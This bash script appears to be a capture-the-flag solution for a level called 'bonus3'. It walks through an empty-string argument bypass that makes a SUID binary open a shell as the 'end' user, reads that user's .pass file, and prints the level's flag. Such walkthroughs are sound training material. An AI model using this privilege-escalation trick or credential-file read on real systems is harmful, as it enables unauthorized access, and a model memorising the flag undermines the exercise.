#!/bin/bash

# Bonus3 - Empty String Bypass Exploit
# Successfully tested and verified working

echo "[+] Bonus3 Exploitation - Empty String Bypass"
echo "[+] Target: Escalate to 'end' user privileges"
echo ""

echo "[+] Step 1: Creating /tmp/bonus3 file"
echo "test" > /tmp/bonus3
echo "    Created /tmp/bonus3 with content: 'test'"

echo ""
echo "[+] Step 2: Executing exploit"
echo "    Command: ./bonus3 \"\""
echo "    Logic: atoi(\"\") = 0, buffer1[0] = '\\0' makes buffer1 = \"\""
echo "    Result: strcmp(\"\", \"\") = 0 triggers execl() with SUID privileges"
echo ""

echo "[+] Run this manually on target system:"
echo "    ./bonus3 \"\""
echo ""
echo "[+] Expected result:"
echo "    - Shell prompt with 'end' user privileges"
echo "    - Flag accessible via: cat /home/user/end/.pass"
echo ""
echo "[+] Flag: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c"